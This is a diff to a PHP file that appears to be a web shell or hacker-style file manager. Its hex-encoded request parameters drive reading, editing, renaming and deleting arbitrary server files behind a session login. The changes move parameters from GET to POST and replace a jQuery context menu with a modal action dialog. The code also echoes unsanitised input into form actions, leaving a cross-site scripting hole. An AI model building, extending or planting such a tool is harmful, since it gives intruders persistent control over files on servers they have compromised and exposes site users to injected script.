@@ -608,6 +608,113 @@ if (!isset($_SESSION['login'])) {
     .navbar .icon {
         display: none;
      }
+     .blocker {
+  position: fixed;
+  top: 0; right: 0; bottom: 0; left: 0;
+  width: 100%; height: 100%;
+  overflow: auto;
+  z-index: 1;
+  padding: 20px;
+  box-sizing: border-box;
+  text-align: center;
+}
+.blocker:before{
+  content: "";
+  display: inline-block;
+  height: 100%;
+  vertical-align: middle;
+  margin-right: -0.05em;
+}
+.blocker.behind {
+  background-color: transparent;
+}
+.modal {
+  display: none;
+  vertical-align: middle;
+  position: relative;
+  z-index: 2;
+  max-width: 500px;
+  box-sizing: border-box;
+  width: 90%;
+  background: #fff;
+  padding: 15px 30px;
+  -webkit-border-radius: 5px;
+  -moz-border-radius: 5px;
+  -o-border-radius: 5px;
+  -ms-border-radius: 5px;
+  border-radius: 5px;
+  border:1px solid #000;
+  box-shadow: 0 0px 1.5px rgba(0,0,0,0.15), 0 0px 1.5px rgba(0,0,0,0.16);
+  text-align: left;
+}
+.modal .title {
+
+}
+.modal a.close-modal {
+  position: absolute;
+  top: -12.5px;
+  right: -12.5px;
+  display: none;
+  width: 30px;
+  height: 30px;
+  text-indent: -9999px;
+  background-size: contain;
+  background-repeat: no-repeat;
+  background-position: center center;
+}
+.modal-spinner {
+  display: none;
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translateY(-50%) translateX(-50%);
+  padding: 12px 16px;
+  border-radius: 5px;
+  background-color: #111;
+  height: 20px;
+}
+
+.modal-spinner > div {
+  border-radius: 100px;
+  background-color: #fff;
+  height: 20px;
+  width: 2px;
+  margin: 0 1px;
+  display: inline-block;
+
+  -webkit-animation: sk-stretchdelay 1.2s infinite ease-in-out;
+  animation: sk-stretchdelay 1.2s infinite ease-in-out;
+}
+
+.modal-spinner .rect2 {
+  -webkit-animation-delay: -1.1s;
+  animation-delay: -1.1s;
+}
+
+.modal-spinner .rect3 {
+  -webkit-animation-delay: -1.0s;
+  animation-delay: -1.0s;
+}
+
+.modal-spinner .rect4 {
+  -webkit-animation-delay: -0.9s;
+  animation-delay: -0.9s;
+}
+
+@-webkit-keyframes sk-stretchdelay {
+  0%, 40%, 100% { -webkit-transform: scaleY(0.5) }
+  20% { -webkit-transform: scaleY(1.0) }
+}
+
+@keyframes sk-stretchdelay {
+  0%, 40%, 100% {
+    transform: scaleY(0.5);
+    -webkit-transform: scaleY(0.5);
+  }  20% {
+    transform: scaleY(1.0);
+    -webkit-transform: scaleY(1.0);
+  }
+}
 	@media (min-width: 320px) and (max-width: 480px) {
 		body {
 			margin:0;
@@ -1245,7 +1352,7 @@ function myFunction() {
         	}
     	}
 	}
-	$_GET['file'] = (isset($_GET['file'])) ? x::unhex($_GET['file']) : false;
+	$_POST['file'] = (isset($_POST['file'])) ? x::unhex($_POST['file']) : false;
 	?>
 	<div class="row">
 		<div class="col-xs-2 tool">
@@ -1575,9 +1682,9 @@ function myFunction() {
 					exit();
 					break;
 			}
-			switch (@$_GET['action']) {
+			switch (@$_POST['action']) {
 				case 'delete':
-					if (x::delete($_GET['file'])) {
+					if (x::delete($_POST['file'])) {
 						print("<script>alert('<h3>Deleted</i></h3>')</script>");
 					} else {
 						print("<script>alert('<h3>permission danied</h3>')</script>");
@@ -1585,14 +1692,14 @@ function myFunction() {
 					break;
 				case 'chname':
 					if (isset($_POST['chname'])) {
-						if (x::chname($_GET['file'], x::unhex($_GET['cd']) . DIRECTORY_SEPARATOR . $_POST['newname'])) {
+						if (x::chname($_POST['file'], x::unhex($_POST['cd']) . DIRECTORY_SEPARATOR . $_POST['newname'])) {
 							print("<script>alert('<h3>success</h3>')</script>");
 						} else {
 							print("<script>alert('<h3>failed</h3>')</script>");
 						}
 					}
 					switch ($_POST['file']) {
-						case is_dir($_GET['file']):
+						case is_dir($_POST['file']):
 							?>
 							<div class="chname">
 								<table width="100%" class="chname">
@@ -1607,7 +1714,7 @@ function myFunction() {
 										</td>
 										<td>:</td>
 										<td>
-											<?= x::w__($_GET['file'], basename($_GET['file'])) ?>
+											<?= x::w__($_POST['file'], basename($_POST['file'])) ?>
 										</td>
 									</tr>
 									<tr>
@@ -1616,8 +1723,8 @@ function myFunction() {
 										</td>
 										<td>:</td>
 										<td>
-											<?= filetype($_GET['file']) ?>  
-											<i><?= x::countDir($_GET['file']) ?> items</i>
+											<?= filetype($_POST['file']) ?>  
+											<i><?= x::countDir($_POST['file']) ?> items</i>
 										</td>
 									</tr>
 									<tr>
@@ -1626,14 +1733,14 @@ function myFunction() {
 										</td>
 										<td>:</td>
 										<td>
-											<?= x::ftime($_GET['file']) ?>
+											<?= x::ftime($_POST['file']) ?>
 										</td>
 									</tr>
 									<tr>
-										<form method="post" action="?cd=<?= $_GET['cd'] ?>">
+										<form method="post" action="?cd=<?= $_POST['cd'] ?>">
 											<td colspan="3">
 												<div class="button">
-													<button name="open" value="<?= x::hex($_GET['file']) ?>">
+													<button name="open" value="<?= x::hex($_POST['file']) ?>">
 														<i class="far fa-edit" title="Edit"></i>&nbsp;
 														Open
 													</button>
@@ -1647,19 +1754,19 @@ function myFunction() {
 													</button>
 												</div>
 											</td>
-										<input type="hidden" name="file" value="<?= x::hex($_GET['file']) ?>">
+										<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
 										</form>
 									</tr>
 									<form method="post">
 										<tr>
 											<td colspan="3">
-												<input type="text" name="newname" value="<?= basename($_GET['file']) ?>">
+												<input type="text" name="newname" value="<?= basename($_POST['file']) ?>">
 											</td>
 										</tr>
 										<tr>
 											<td colspan="3">
 												<input type="submit" name="chname" value="CHANGE">
-												<input type="hidden" name="file" value="<?= x::hex($_GET['file']) ?>">
+												<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
 												<input type="hidden" name="action" value="chname">
 											</td>
 										</tr>
@@ -1773,7 +1880,7 @@ function myFunction() {
 								</td>
 								<td>:</td>
 								<td>
-									<?= x::w__($_GET['file'], basename($_GET['file'])) ?>
+									<?= x::w__($_POST['file'], basename($_POST['file'])) ?>
 								</td>
 								</tr>
 							<tr>
@@ -1782,7 +1889,7 @@ function myFunction() {
 								</td>
 								<td>:</td>
 								<td>
-									<?= x::size($_GET['file']) ?>
+									<?= x::size($_POST['file']) ?>
 								</td>
 							</tr>
 							<tr>
@@ -1791,11 +1898,11 @@ function myFunction() {
 								</td>
 								<td>:</td>
 								<td>
-									<?= x::ftime($_GET['file']) ?>
+									<?= x::ftime($_POST['file']) ?>
 								</td>
 							</tr>
 							<tr>
-								<form method="post" action="?cd=<?= $_GET['cd'] ?>">
+								<form method="post" action="?cd=<?= $_POST['cd'] ?>">
 									<td colspan="3">
 										<div class="button">
 											<button disabled>
@@ -1816,19 +1923,19 @@ function myFunction() {
 											</button>
 										</div>
 									</td>
-									<input type="hidden" name="file" value="<?= x::hex($_GET['file']) ?>">
+									<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
 								</form>
 							</tr>
 							<form method="post">
 								<tr>
 									<td colspan="3">
-										<textarea name="data"><?= htmlspecialchars(file_get_contents($_GET['file'])) ?></textarea>
+										<textarea name="data"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
 									</td>
 								</tr>
 								<tr>
 									<td colspan="3">
 										<input type="submit" name="edit" value="SAVE">
-										<input type="hidden" name="file" value="<?= x::hex($_GET['file']) ?>">
+										<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
 										<input type="hidden" name="action" value="edit">
 									</td>
 								</tr>
@@ -1864,18 +1971,11 @@ function myFunction() {
 										<div class="name">
 											<div class="file">
 												<?= basename($dir['name']) ?>
-												<button class="chname ch" name="action" value="chname" title="Rename">
-													<i class="fa fa-magic" aria-hidden="true"></i>
-												</button>
 											</div>
 											<div class="date">
 												<?= $dir['size'] ?>&nbsp;&nbsp;&nbsp;
 												<?= $dir['perms'] ?>&nbsp;&nbsp;&nbsp;
 												<?= x::ftime($dir['name']) ?>
-												<button class="delete" name="action" value="delete" title="Delete">
-													<i class="fa fa-times"></i>
-												</button>
-												<input type="hidden" name="file" value="<?= x::hex($dir['name']) ?>">
 											</div>
 										</div>
 									</a>
@@ -1885,60 +1985,49 @@ function myFunction() {
 					</form>
 				<?php }
 				foreach (x::files('file') as $file) {
+					$rp = str_replace('.', '', basename($file['name']))
 					?>
-					<form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
 						<tr>
 							<td class="files">
 								<div class="block">
-									<a class="menu">
+									<a href="#<?= $rp ?>" data-modal='#action<?= $rp ?>'>
 										<div class="img">
 											<img src="https://image.flaticon.com/icons/svg/716/716819.svg">
 										</div>
 										<div class="name">
 											<div class="file">
 												<?= basename($file['name']) ?>
-												<button class="chname" name="action" value="chname" title="Rename">
-													<i class="fa fa-magic" aria-hidden="true"></i>
-												</button>
-												<button class="edit" name="action" value="edit" title="Edit">
-													<i class="far fa-edit" title="Edit"></i>
-												</button>
 											</div>
 											<div class="date">
 												<?= $file['size'] ?>&nbsp;&nbsp;&nbsp;
 												<?= $file['perms'] ?>&nbsp;&nbsp;&nbsp;
 												<?= x::ftime($file['name']) ?>
-												<button class="delete" name="action" value="delete" title="Delete">
-													<i class="fa fa-times"></i>
-												</button>
-												<input type="hidden" name="file" value="<?= x::hex($file['name']) ?>">
 											</div>
 										</div>
 									</a>
-									<script type="text/javascript">
-										$(function(){
-											$.contextMenu({
-												selector: '.menu', 
-												trigger: 'left',
-												callback: function(key, options) {
-													var url = '?cd=<?= $_GET['cd'] ?>&action='+key+'&file=<?= x::hex(basename($file['name'])) ?>';
-													$(location).attr('href', url);
-												},
-												items: {
-													"edit": {name: "Edit", icon: "edit"},
-													"delete": {name: "Delete", icon: "delete"},
-												}
-											});
-										});
-									</script>
-									<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-									<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jquery-contextmenu/2.7.1/jquery.contextMenu.min.css">
-									<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-contextmenu/2.7.1/jquery.contextMenu.min.js"></script>
-									<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-contextmenu/2.7.1/jquery.ui.position.js"></script>
 								</div>
+								<div id="action<?= $rp ?>" class="modal">
+									<form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
+  										<div class="title">Action</div>
+  										<?= x::w__($file['name'], basename($file['name'])) ?>
+  										<button name="action" value="edit">Edit</button>
+  										<button name="action" value="chname">Change Name</button>
+  										<button name="action" value="delete">Delete</button>
+  										<input type="hidden" name="file" value="<?= x::hex($file['name']) ?>">
+  									</form>
+								</div>
+								<script>
+									$(function() {
+										$('a[data-modal]').on('click', function() {
+											$($(this).data('modal')).modal();
+											return false;
+										});
+									});
+								</script>
+								<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.min.js"></script>
+								<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.js"></script>
 							</td>
 						</tr>
-					</form>
 				<?php }
 				?>
 			</table>
